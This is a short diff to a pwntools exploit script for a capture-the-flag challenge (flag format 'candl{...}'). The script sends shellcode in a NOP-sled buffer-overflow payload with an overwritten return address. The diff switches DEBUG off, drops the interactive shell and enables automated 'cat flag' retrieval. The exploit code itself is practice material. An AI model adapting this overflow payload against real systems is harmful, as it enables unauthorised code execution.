@@ -1,7 +1,7 @@
 from pwn import *
 import os
 
-DEBUG = True 
+DEBUG = False 
 
 shellcode = asm('''
 xor    eax,eax
@@ -69,12 +69,11 @@ else:
 
 payload = sled + b"A" * (max_len - len(sled)) + p32(buffer_address)
 io.send(payload)
-io.interactive()
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
-# import re
-# io.sendlineafter(b'$', b'cat flag')
-# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
-# print(flag)
+import re
+io.sendlineafter(b'Hello', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
